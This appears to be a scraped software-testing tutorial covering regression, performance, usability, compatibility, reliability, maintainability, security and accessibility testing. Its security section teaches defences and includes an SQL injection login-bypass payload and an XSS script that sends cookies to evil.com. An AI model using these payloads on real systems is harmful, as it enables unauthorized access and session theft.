docs.text: A developer fixes a bug in the payment module. Unknowingly, the change breaks the order history page — a completely unrelated feature. Regression testing would catch this.

docs.title: When to Run Regression Tests
docs.text: Trigger Example Bug fix deployed Fixed login bug → retest entire auth flow New feature added Added dark mode → retest all UI flows Code refactoring Optimized DB queries → retest all data flows Configuration change Changed server settings → retest critical paths Third-party library update Upgraded payment SDK → retest payment flows

docs.title: 1. Full Regression
docs.text: Run the entire test suite after major changes. - Most thorough but time-consuming - Used before major releases

docs.title: 2. Partial/Selective Regression
docs.text: Run only tests related to the changed area plus high-risk areas. - Faster, risk-based approach - Used in Agile sprints

docs.title: 3. Progressive Regression
docs.text: Add new test cases for the new feature plus run existing suite. - Used when adding new functionality

docs.title: 4. Corrective Regression
docs.text: Run existing tests when no major code changes — just verify nothing changed.

docs.title: Regression Testing Strategy
docs.text:
1. Identify changed components
         ↓
2. Assess impact (which features could be affected?)
         ↓
3. Select test cases (all related + critical paths)
         ↓
4. Execute tests
         ↓
5. Report new defects found

docs.title: Regression Test Selection Criteria
docs.text: Select test cases that cover: - ✅ All fixed bugs from this release - ✅ Features that share code with the changed module - ✅ All critical business flows (smoke tests) - ✅ Previously failing tests that were later fixed - ✅ Boundary condition tests

docs.title: Automating Regression Tests
docs.text:
Regression testing is the #1 use case for test automation because: - It's repetitive (run every sprint/build) - It's time-consuming when done manually - It has stable, well-understood test cases

# Pytest regression suite example
@pytest.mark.regression
def test_login_still_works_after_payment_fix():
    page = LoginPage(driver)
    page.login("user@test.com", "Pass@123")
    assert page.is_dashboard_loaded()

@pytest.mark.regression
def test_order_history_not_broken():
    page = OrderHistoryPage(driver)
    orders = page.get_orders()
    assert len(orders) > 0

docs.title: Regression in Agile/CI-CD
docs.text:
Sprint 1: 50 test cases (automated)
Sprint 2: +20 new TCs → Total 70 automated
Sprint 3: +15 new TCs → Total 85 automated

Every build → All 85 regression tests run automatically

docs.title: Tools for Regression Automation
docs.text: Tool Language Best For Selenium + Pytest Python Web UI regression Playwright JS/Python Modern web apps Rest Assured Java API regression JMeter N/A Performance regression Postman/Newman JS API regression in CI

docs.title: 📌 Key Takeaways
docs.text:
• Every code change should trigger regression testing
  • Automate regression tests — running manually every sprint is unsustainable
  • Use risk-based selection to balance speed and coverage
  • Regression is the biggest ROI area for test automation
  • Keep regression suite fast — slow suites get skipped

Related: Smoke Testing | Sanity Testing

docs.title: What Is Performance Testing?
docs.text:
Performance Testing is a type of non-functional testing that determines how a system performs in terms of speed, scalability, stability, and responsiveness under a given workload.

"Performance testing answers: Can the system handle real-world usage without degrading user experience?"

docs.title: Why Performance Testing Matters
docs.text: Without Performance Testing With Performance Testing App crashes on launch day Capacity planned in advance Slow pages → users leave Response times optimized Revenue lost during peak Bottlenecks identified & fixed Reputation damaged Confident release

docs.title: Real-World Failures
docs.text:
• Amazon (2013): 1 second delay = $1.6B revenue loss/year
  • Flipkart Big Billion Day: Site crashed due to unexpected traffic spike
  • Healthcare.gov (2013): Couldn't handle 250,000 users on launch day

docs.title: 1. 📈 Load Testing
docs.text: Tests system behavior under expected normal load. - How does the app perform with 1000 concurrent users? - Response time, throughput, error rate measured

docs.title: 2. 💪 Stress Testing
docs.text: Tests system behavior beyond normal capacity until it breaks. - What happens at 5000, 10000 users? - Find the breaking point

docs.title: 3. 🔥 Spike Testing
docs.text: Tests system with sudden, sharp increases in load. - Flash sale scenario: 0 → 10,000 users in 10 seconds

docs.title: 4. 🏊 Soak/Endurance Testing
docs.text: Tests system under sustained load over extended period. - Can app handle 500 users continuously for 8 hours? - Identifies memory leaks, degradation over time

docs.title: 5. 📊 Scalability Testing
docs.text: Tests how well system scales as load increases. - Does adding more servers proportionally increase capacity?

docs.title: 6. 🏔️ Volume Testing
docs.text: Tests with large amounts of data in the database. - How does app perform with 10 million records in DB?

docs.title: Key Performance Metrics
docs.text: Metric Definition Target Response Time Time from request to response < 2 seconds (web) Throughput Requests processed per second Depends on system Error Rate % of failed requests < 1% Concurrent Users Simultaneous active users Per business requirement CPU Utilization Server CPU usage < 70-80% under load Memory Usage RAM consumption over time Stable, no leaks Latency Network delay < 200ms

docs.title: Performance Testing Process
docs.text:
1. Define Performance Requirements
   (e.g., "Page load < 3s for 1000 users")
         ↓
2. Create Test Environment
   (mirroring production)
         ↓
3. Create Test Scenarios
   (user journeys to simulate)
         ↓
4. Configure & Execute Tests
   (JMeter, k6, Gatling)
         ↓
5. Monitor & Collect Results
   (APM tools: New Relic, Grafana)
         ↓
6. Analyze Results
   (Find bottlenecks)
         ↓
7. Report & Optimize

docs.title: Performance Testing Tools
docs.text: Tool Type Language Best For Apache JMeter Load GUI/XML Web apps, APIs k6 Load JavaScript Modern APIs, CI/CD Gatling Load Scala High-performance testing Locust Load Python Pythonic, scriptable Artillery Load JavaScript APIs, microservices New Relic Monitoring N/A Production monitoring Grafana Monitoring N/A Metrics dashboards

docs.title: Sample JMeter Test Plan Structure
docs.text:
Thread Group (1000 users, 60 sec ramp-up, 5 min duration)
├── HTTP Request: Login API
├── HTTP Request: Get Products
├── HTTP Request: Add to Cart
├── HTTP Request: Checkout
└── Listeners:
    ├── Summary Report
    ├── Response Time Graph
    └── Active Threads Over Time

docs.title: 📌 Key Takeaways
docs.text:
• Performance testing ≠ just load testing — it's a category of many test types
  • Always test in an environment that mirrors production
  • Define clear acceptance criteria before testing (SLAs)
  • Performance issues found in production = very expensive
  • Automate performance tests in CI/CD pipelines

Related: Load Testing | Stress Testing | JMeter Guide

docs.title: What is Usability Testing?
docs.text: Usability Testing is a non-functional testing technique that evaluates how easy and user-friendly a software application is. It measures the software's ease of use, learning curve, and overall user satisfaction.

docs.title: 5 Core Components of Usability
docs.text:
1. Learnability: How easy is it for users to accomplish basic tasks the first time they encounter the design?
  2. Efficiency: Once users have learned the design, how quickly can they perform tasks?
  3. Memorability: When users return to the design after a period of not using it, how easily can they reestablish proficiency?
  4. Errors: How many errors do users make, how severe are these errors, and how easily can they recover from the errors?
  5. Satisfaction: How pleasant is it to use the design?

docs.title: How to Conduct Usability Testing
docs.text:
1. Identify the Target Audience: Define the demographics (age, tech-savviness, profession) of your real users.
  2. Recruit Participants: Gather a group of representative users (usually 5-8 users can uncover 80% of usability problems).
  3. Define Tasks: Create realistic, goal-oriented scenarios (e.g., "Find a red shirt in size Medium and add it to your cart").
  4. Conduct Sessions: Observe users interacting with the software. Do not guide them. Record their screens, clicks, and verbal feedback.
  5. Analyze and Report: Identify pain points (e.g., users couldn't find the checkout button because it blended in with the background).

docs.title: Hallway Testing
docs.text: A quick, informal method of usability testing where you grab random people (e.g., colleagues from other departments in the hallway) and ask them to try the software. Good for catching glaringly obvious UX flaws early.

docs.title: 📌 Key Takeaways
docs.text:
• Usability testing focuses on the User Experience (UX).
  • It answers the question: "Is the software intuitive?"
  • Cannot be fully automated; it requires real human observation.

docs.title: What is Compatibility Testing?
docs.text: Compatibility Testing is a non-functional testing type used to ensure that the software application works flawlessly across different environments, including various web browsers, operating systems, hardware, and network configurations.

docs.title: 1. Browser Compatibility (Cross-Browser Testing)
docs.text: Ensuring a web application renders correctly and functions properly across different browsers (Chrome, Firefox, Safari, Edge) and their various versions. - Why it matters: Different browsers use different rendering engines (Blink, Gecko, WebKit), which can interpret CSS and JS differently.

docs.title: 2. Operating System (OS) Compatibility
docs.text: Ensuring the software works on different operating systems (Windows, macOS, Linux, iOS, Android).

docs.title: 3. Device/Hardware Compatibility
docs.text: Testing the application on different physical devices (desktops, laptops, tablets, smartphones) to check UI responsiveness and hardware constraints (CPU, memory).

docs.title: 4. Network Compatibility
docs.text: Testing how the application behaves under different network conditions (Wi-Fi, 4G, 5G, offline mode, low bandwidth).

docs.title: 5. Backward Compatibility
docs.text: Ensuring the new version of the software is compatible with older versions of its environment or data formats (e.g., Can a Word 2024 app open a Word 2003 .doc file?).

docs.title: Compatibility Matrix
docs.text:
A standard artifact created during test planning to define exactly which environments will be supported and tested.

OS Browser Priority Windows 11 Chrome (Latest) P1 (Must Test) macOS 14 Safari 17 P1 (Must Test) Android 14 Chrome Mobile P1 (Must Test) Windows 10 Edge P2 (Test if time permits) Windows 8 IE 11 Out of Scope (Do not test)

docs.title: 📌 Key Takeaways
docs.text:
• Helps prevent the "It works on my machine" problem.
  • BrowserStack and Sauce Labs are popular cloud platforms that provide access to thousands of real devices for compatibility testing.

docs.title: What is Reliability Testing?
docs.text:
Reliability Testing is a non-functional testing type that verifies whether the software can perform its specified functions without failure under defined conditions for a specified period of time.

"Can we trust the software to run continuously without crashing?"

docs.title: Key Metrics for Reliability
docs.text:
1. MTTF (Mean Time To Failure): The average time a system operates correctly before a failure occurs. (Higher is better).
  2. MTTR (Mean Time To Repair/Recover): The average time it takes to fix a failure and restore the system to working order. (Lower is better).
  3. MTBF (Mean Time Between Failures): $\text{MTBF} = \text{MTTF} + \text{MTTR}$. Represents the total operational cycle.

docs.title: 1. Feature Testing
docs.text: Verifying all features execute correctly. This overlaps heavily with functional testing, but specifically tracks if a feature fails intermittently over many executions.

docs.title: 2. Load / Endurance (Soak) Testing
docs.text: Running the application under a normal or high load for an extended duration (e.g., 48 hours) to detect memory leaks, database connection drops, and long-term degradation.

docs.title: 3. Regression Testing
docs.text: Repeatedly running tests to ensure that bug fixes or new features haven't introduced new instability into the system over time.

docs.title: Reliability vs. Availability
docs.text:
• Reliability: Probability that the system will not fail during a specific time period. (e.g., A pacemaker must be 100% reliable).
  • Availability: The percentage of time the system is operational and accessible to users. (e.g., "Five Nines" availability means $99.999\%$ uptime, allowing for ~5 minutes of downtime per year). A system can be highly available but unreliable if it crashes often but reboots in milliseconds.

docs.title: 📌 Key Takeaways
docs.text:
• Essential for critical systems (aviation, medical devices, banking).
  • Often requires simulating long-term usage using automation tools.

docs.title: What is Maintainability?
docs.text:
Maintainability evaluates how easy it is to modify the software system or component to correct defects, improve performance, or adapt it to a changing environment.

"How much effort will it take the development team to fix a bug or add a new feature next year?"

docs.title: Why is Maintainability Testing Important?
docs.text: Software spends the vast majority of its lifecycle in the maintenance phase (after the initial release). If code is poorly written, tangled, and undocumented, the cost of maintaining the software will quickly exceed the cost of its initial development. This is known as Technical Debt.

docs.title: Characteristics Evaluated in Maintainability
docs.text:
1. Analyzability: How easy is it to diagnose the root cause of a failure? Are error logs clear, structured, and centralized?
  2. Modifiability: How easy is it to change the code? Does changing a small function in the payment module break the login module? (Loose coupling and high cohesion are good).
  3. Stability: The degree to which unexpected effects are avoided when the software is modified. (Can be verified by having a comprehensive automated regression suite).
  4. Testability: How easy is it to write automated tests for the code? Does the code rely on massive, untestable monolithic functions, or small, testable units?

docs.title: How to Test Maintainability
docs.text:
Maintainability is rarely tested dynamically (by running the app). It is primarily evaluated using Static Testing:

  • Code Reviews / Peer Reviews: Developers reviewing each other's code for readability and adherence to standards.
  • Static Analysis Tools: Tools like SonarQube that scan the source code to identify code smells, cyclomatic complexity, duplicated code, and security vulnerabilities.

docs.title: 📌 Key Takeaways
docs.text:
• High maintainability reduces long-term costs and Technical Debt.
  • It is evaluated primarily through Static Analysis and Code Reviews.
  • Highly testable code is usually highly maintainable code.

docs.title: What Is Security Testing?
docs.text:
Security Testing is a type of non-functional testing that identifies vulnerabilities, threats, risks, and weaknesses in a software application to prevent unauthorized access, data breaches, and cyberattacks.

"The goal is to find vulnerabilities before hackers do."

docs.title: Why Security Testing Is Critical
docs.text: Threat Real Example Cost Data breach Yahoo (2016) — 3B accounts $350M settlement SQL Injection Sony PlayStation Network $171M + reputation XSS Attack British Airways (2018) £20M fine (GDPR) Credential stuffing Netflix, Spotify account theft Revenue + trust loss

docs.title: 1. 🔍 Vulnerability Assessment
docs.text: Systematic review to identify known security weaknesses. - Tools: Nessus, OpenVAS, Qualys

docs.title: 2. 🎯 Penetration Testing (Pen Test)
docs.text: Simulated cyberattack to exploit vulnerabilities. - Black-box pentest: Tester has no prior knowledge - White-box pentest: Full system access given - Grey-box pentest: Partial knowledge

docs.title: 3. 🔐 Authentication Testing
docs.text: Testing login, session, and access control mechanisms. - Brute force protection - Password policies - MFA/2FA verification

docs.title: 4. 💉 Injection Testing
docs.text: Testing for SQL, LDAP, XML, command injection vulnerabilities.

docs.title: 5. 🔏 Cryptography Testing
docs.text: Verifying data is properly encrypted in transit and at rest. - HTTPS/TLS verification - Password hashing (bcrypt, Argon2)

docs.title: OWASP Top 10 (2021)
docs.text:
The Open Web Application Security Project defines the top 10 most critical web vulnerabilities:

Rank Vulnerability Description A01 Broken Access Control Users can act beyond permissions A02 Cryptographic Failures Weak/missing encryption A03 Injection SQLi, XSS, command injection A04 Insecure Design Missing security controls in design A05 Security Misconfiguration Wrong permissions, default passwords A06 Vulnerable Components Outdated libraries/frameworks A07 Auth & Session Failures Weak authentication, session hijack A08 Data Integrity Failures Unsigned data/code A09 Logging Failures No audit trail for attacks A10 SSRF Server-Side Request Forgery

docs.title: SQL Injection
docs.text:
-- Normal query
SELECT * FROM users WHERE email='user@test.com' AND password='pass123';

-- SQL Injection attack payload
Email: ' OR '1'='1'; --
-- Becomes:
SELECT * FROM users WHERE email='' OR '1'='1'; --' AND password='anything';
-- Returns ALL users → bypass login!

docs.title: XSS (Cross-Site Scripting)
docs.text:
<!-- Attacker injects in a comment field -->
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

docs.title: How to Prevent:
docs.text:
• SQLi: Use parameterized queries / ORM
  • XSS: Sanitize/escape all user inputs, Content-Security-Policy headers

docs.title: Security Testing Checklist
docs.text:
Authentication
  [ ] Brute force protection (lockout after N attempts)
  [ ] Password complexity enforced
  [ ] MFA available
  [ ] Secure session tokens (random, long)
  [ ] Session expires on logout

Authorization
  [ ] Role-based access control works
  [ ] Users can't access other users' data
  [ ] Admin functions protected from regular users

Data Protection
  [ ] Passwords hashed (bcrypt/Argon2) — NOT stored plain
  [ ] Sensitive data encrypted at rest
  [ ] HTTPS enforced (no HTTP fallback)
  [ ] Credit card data not stored

Input Validation
  [ ] All inputs sanitized
  [ ] SQL injection payloads rejected
  [ ] XSS payloads escaped
  [ ] File upload restricted to safe types

API Security
  [ ] API requires authentication
  [ ] Rate limiting in place
  [ ] CORS configured correctly
  [ ] Sensitive data not in URLs

docs.title: Security Testing Tools
docs.text: Tool Purpose Free? OWASP ZAP Web vulnerability scanner ✅ Free Burp Suite Web security testing proxy Freemium Nmap Network scanning ✅ Free Metasploit Penetration testing framework ✅ Free SQLMap Automated SQL injection ✅ Free Nessus Vulnerability assessment Paid

docs.title: 📌 Key Takeaways
docs.text:
• Security is everyone's responsibility — not just the security team
  • OWASP Top 10 is the industry standard reference for web vulnerabilities
  • Shift security left — include security reviews from requirements phase
  • Never store passwords in plain text
  • Always test for OWASP Top 10 at minimum

Related: OWASP Top 10 Deep Dive

docs.title: What is Accessibility Testing?
docs.text:
Accessibility Testing ensures that a software application (usually a website or mobile app) is usable by people with disabilities, including those with visual, auditory, physical, speech, cognitive, and neurological impairments.

Note: It is often abbreviated as a11y (an "a", followed by 11 letters, followed by a "y").

docs.title: Why is it Important?
docs.text:
1. Inclusivity: Ensures everyone has equal access to digital services.
  2. Legal Compliance: Many countries have laws mandating web accessibility (e.g., ADA in the USA, EAA in Europe, Section 508 for US Federal agencies). Failure to comply can result in massive lawsuits.
  3. SEO: Many accessibility best practices (like image alt tags and semantic HTML) directly improve search engine rankings.

docs.title: WCAG (Web Content Accessibility Guidelines)
docs.text: The international standard for web accessibility. It is categorized into three conformance levels: - Level A: Minimum level. Without this, the site is impossible for some users to access. - Level AA: The standard target for most commercial and government websites. - Level AAA: The highest and strictest level (often unnecessary for standard websites).

docs.title: 1. Visual Impairments (Blindness, Low Vision, Color Blindness)
docs.text:
• Screen Reader Compatibility: Can software like JAWS, NVDA, or Apple VoiceOver read the page logically?
  • Alt Text: Do all meaningful images have descriptive alt tags?
  • Color Contrast: Is the contrast ratio between text and background at least $4.5:1$ (WCAG AA standard)?
  • Color Reliance: Is color the only way information is conveyed? (e.g., Error fields should be red and have an error icon/text).

docs.title: 2. Motor/Physical Impairments
docs.text:
• Keyboard Navigation: Can the entire application be navigated and operated using only the Tab, Enter, Space, and Arrow keys?
  • Focus Indicators: Is it visually obvious which element currently has keyboard focus?

docs.title: 3. Auditory Impairments
docs.text: • Captions/Transcripts: Do all videos have accurate closed captions?

docs.title: Accessibility Testing Tools
docs.text:
• Automated Scanners: Axe DevTools, Lighthouse, WAVE (Finds ~30% of issues like contrast and missing alt tags).
  • Screen Readers: NVDA (Windows), VoiceOver (Mac/iOS).
  • Manual Checks: Unplug the mouse and try to use the site.

docs.title: 📌 Key Takeaways
docs.text:
• Accessibility is not just a nice-to-have; it is a legal requirement for many businesses.
  • Automation tools can only catch structural errors; manual testing with a keyboard and screen reader is mandatory.

docs.title: 📐 Test Design Techniques
docs.text: Test design techniques are systematic approaches used to identify and design test cases to achieve optimal test coverage.
